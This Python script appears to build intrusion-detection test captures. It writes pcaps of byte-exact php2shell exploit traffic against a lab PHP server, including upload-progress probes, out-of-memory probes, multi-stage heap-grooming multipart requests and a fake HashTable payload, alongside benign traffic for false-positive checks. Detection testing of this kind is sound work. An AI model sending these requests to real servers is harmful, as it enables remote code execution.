#!/usr/bin/env python3
"""gen_traffic.py - replays byte-exact php2shell HTTP traffic into a pcap.

Request bodies are built with the upstream toolkit's OWN builders
(lib.chain, lib.oomprobe are imported), so the pcap matches the real wire
format. Server responses reproduce the vulnerable-state signals described
in lib/chain.py and lib/oomprobe.py (OOM fatal in parser, heap-leak
Set-Cookie, empty-500 / 502 differential).

Environment:
  P2S_REPO   upstream clone (default: ../php2shell)
  OUT_DIR    pcap output directory (default: this script's directory)

Outputs: attack.pcap (exploit traffic) + benign.pcap (FPS regression set)
"""
import os
import sys

REPO = os.path.expanduser("~/php2shell-lab/php2shell")
sys.path.insert(0, REPO)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from lib.chain import build_multipart, SID, Chain, Target  # noqa: E402
from lib.oomprobe import _nested_name, _multipart_body      # noqa: E402
from pcap_build import write_pcap                           # noqa: E402

CIP, SIP = "203.0.113.77", "198.51.100.10"   # attack client / lab server
BCIP = "198.51.100.55"                        # benign client
PORT = 80

### helpers --

def http_req(path="/index.php", host=None, headers=None, body=b""):
    h = f"POST {path} HTTP/1.1\r\nHost: {host or '198.51.100.10'}\r\n"
    for k, v in (headers or {}).items():
        h += f"{k}: {v}\r\n"
    h += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    return h.encode() + body

def http_resp(status="200 OK", headers="", body=b""):
    return (f"HTTP/1.1 {status}\r\nServer: Apache\r\n"
            f"X-Powered-By: PHP/8.4.26\r\n{headers}"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode() + body

def cookie_leak(n):
    """Heap-leak PHPSESSID: n bytes of url-encoded binary + '; path=/'."""
    import random
    random.seed(42 + n)
    raw = bytes(random.randrange(256) for _ in range(n))
    # force a 0x7f pointer byte early (stage-2 libphp leak shape)
    raw = raw[:9] + b"\x7f" + raw[10:]
    enc = "".join("%"+("%02X" % b) if (b < 0x21 or b > 0x7E or chr(b) in ";,= ")
                  else chr(b) for b in raw).encode()
    return f"Set-Cookie: PHPSESSID={enc.decode()}; path=/\r\n"

def fake_ht_blobs():
    """167-byte fake HashTable carrier, byte-identical via Chain._fake_payload."""
    from lib.chain import PROFILES
    p = PROFILES["bookworm"]
    c = Chain(Target(f"http://{SIP}:{PORT}/"), "id>/out/p1", profile="bookworm",
              verbose=False)
    return c._fake_payload(p["htdata"], p["zif"])

### attack scenarios (A)

def s_detect_probe():
    # lib/detect.py _probe_upload_progress, byte-exact shape
    boundary = "----php2shellprobe"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"probe\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"php2shellprobe0001\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    req = http_req(headers={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
    }, body=body)
    resp = http_resp(headers="Set-Cookie: PHPSESSID=php2shellprobe0001; path=/\r\n",
                     body=b"OK\n")
    return {"cip": CIP, "cport": 41000, "sip": SIP, "sport": PORT, "req": req, "resp": resp}

def s_oom(size_mb, cport, resp_fn):
    name = _nested_name()
    body = _multipart_body(name, b"A" * (size_mb * 1024 * 1024), boundary="x")
    req = http_req(headers={"Content-Type": 'multipart/form-data; boundary="x"',
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
                   body=body)
    return {"cip": CIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": req, "resp": resp_fn()}

def oom_fatal_resp():
    body = (b"<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes "
            b"exhausted (tried to allocate 133169 bytes) in "
            b"<b>Unknown</b> on line <b>0</b><br />\n")
    return http_resp(status="500 Internal Server Error", body=body)

def s_memprobe():
    # lib/memprobe.py: P2SMEMPROBE + upload_progress=p2smem + big field
    parts = [{"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p2smem"},
             {"name": "big", "data": b"B" * (10 * 1024 * 1024)}]
    body = build_multipart(parts, b"P2SMEMPROBE")
    req = http_req(headers={"Content-Type": "multipart/form-data; boundary=P2SMEMPROBE"},
                   body=body)
    return {"cip": CIP, "cport": 41040, "sip": SIP, "sport": PORT,
            "req": req, "resp": oom_fatal_resp()}

def s_chain_stage_first(cport, big_mb=12, extra_headers=None, resp_fn=None):
    # chain.rotate()/stage1()/stage2()/stage3() FIRST request: Sx17
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, b"S" * 17)
    req = http_req(headers={"Content-Type": "multipart/form-data; boundary=" + "S" * 17,
                            **(extra_headers or {})}, body=body)
    return {"cip": CIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": req, "resp": (resp_fn or (lambda: http_resp(body=b"OK\n")))()}

def s_chain_stage_second(cport, leak_bytes=None, variant="stage1"):
    # stage1-second: p-fields; stage2-second: a0000[j] fields; both Bx10
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    if variant == "stage1":
        for i in range(1001):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        import struct as _s
        _s.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
    else:  # stage2 shape
        for i in range(983):
            cnt = 16 if i == 470 else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 39})
    body = build_multipart(parts, b"B" * 10)
    req = http_req(headers={"Content-Type": "multipart/form-data; boundary=" + "B" * 10},
                   body=body)
    hdr = cookie_leak(leak_bytes) if leak_bytes else ""
    return {"cip": CIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": req, "resp": http_resp(headers=hdr, body=b"OK\n")}

def s_chain_stage3_final(cport):
    ht, _ref = fake_ht_blobs()
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(2):
        parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts.append({"name": "g00", "data": b"F" * 15})
    for i in range(15):
        parts.append({"name": f"a{i:030d}"[:31], "data": ht})
    body = build_multipart(parts, b"B" * 10)
    req = http_req(headers={"Content-Type": "multipart/form-data; boundary=" + "B" * 10},
                   body=body)
    return {"cip": CIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": req, "resp": http_resp(body=b"OK\n")}

def s_rotate_second(cport):
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    body = build_multipart(parts, b"BNDRY12345")
    req = http_req(headers={"Content-Type": "multipart/form-data; boundary=BNDRY12345"},
                   body=body)
    # worker aborts mid-request: empty 500 (differential signal)
    return {"cip": CIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": req, "resp": http_resp(status="500 Internal Server Error", body=b"")}

### benign scenarios (B)

def b_normal_upload(cport):
    boundary = "---------------------------7e319262b21c4"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"bd7f2a0c9e8b4a1d\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="upload"; filename="report.pdf"\r\n'
        f"Content-Type: application/pdf\r\n\r\n"
        + ("%PDF-1.4 " + "x" * 50000 + "\r\n")
        + f"--{boundary}--\r\n"
    ).encode()
    req = http_req(headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": f"multipart/form-data; boundary={boundary}"}, body=body)
    return {"cip": BCIP, "cport": cport, "sip": SIP, "sport": PORT, "req": req,
            "resp": http_resp(body=b"upload ok")}

def b_normal_cookie(cport):
    req = http_req(path="/", headers={"User-Agent": "curl/7.88"}, body=b"")
    hdr = "Set-Cookie: PHPSESSID=8f4c2b6d9e0a1c3f5a7b9d0e2c4a6f8b; path=/\r\n"
    return {"cip": BCIP, "cport": cport, "sip": SIP, "sport": PORT, "req": req,
            "resp": http_resp(headers=hdr, body=b"<html>hello</html>")}

def b_app_oom_error(cport):
    # OOM in APPLICATION code (location NOT "Unknown") - must NOT match S1
    body = (b"<b>Fatal error</b>:  Allowed memory size of 134217728 bytes "
            b"exhausted (tried to allocate 20480 bytes) in "
            b"<b>/var/www/html/app.php</b> on line <b>42</b><br />\n")
    return {"cip": BCIP, "cport": cport, "sip": SIP, "sport": PORT,
            "req": http_req(path="/heavy.php", body=b"x=1"),
            "resp": http_resp(status="500 Internal Server Error", body=body)}

def b_big_upload_no_up(cport):
    # 11MB legit upload WITHOUT upload_progress -> A6 must not fire
    boundary = "------------------------aBcD1234"
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="data"; filename="blob.bin"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n").encode() \
        + b"D" * (11 * 1024 * 1024) + f"\r\n--{boundary}--\r\n".encode()
    req = http_req(headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                   body=body)
    return {"cip": BCIP, "cport": cport, "sip": SIP, "sport": PORT, "req": req,
            "resp": http_resp(body=b"ok")}

def b_homepage(cport):
    req = f"GET / HTTP/1.1\r\nHost: 198.51.100.10\r\nUser-Agent: Mozilla/5.0 " \
          f"(Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\r\n\r\n".encode()
    return {"cip": BCIP, "cport": cport, "sip": SIP, "sport": PORT, "req": req,
            "resp": http_resp(body=b"<html>OK</html>")}

### main --

def main():
    attack = [
        s_detect_probe(),                    # 41000  -> 1100008 + xbit
        s_oom(1, 41001, oom_fatal_resp),     #        -> 1100007,1100010,1100012
        s_oom(8, 41002, lambda: http_resp(status="502 Bad Gateway", body=b"")),
        s_memprobe(),                        # 41040  -> 1100009,1100006,1100012
        s_chain_stage_first(41010),          #        -> 1100001,1100006
        s_chain_stage_second(41011, leak_bytes=1100, variant="stage1"),
        s_chain_stage_first(41012, extra_headers={"Cookie": "PHPSESSID=" + "a" * 32}),
        s_chain_stage_second(41013, leak_bytes=4096, variant="stage2"),
        s_chain_stage_first(41014, big_mb=10),
        s_chain_stage3_final(41015),         #        -> 1100002
        s_rotate_second(41016),              #        -> 1100003, 1100013 (xbit)
    ]
    benign = [
        b_homepage(42000),
        b_normal_cookie(42001),
        b_normal_upload(42002),
        b_app_oom_error(42003),
        b_big_upload_no_up(42004),
    ]
    here = os.environ.get("OUT_DIR", os.path.dirname(os.path.abspath(__file__)))
    os.makedirs(here, exist_ok=True)
    n1 = write_pcap(os.path.join(here, "attack.pcap"), attack)
    n2 = write_pcap(os.path.join(here, "benign.pcap"), benign)
    print(f"attack.pcap: {len(attack)} streams, {n1} packets")
    print(f"benign.pcap: {len(benign)} streams, {n2} packets")

if __name__ == "__main__":
    main()
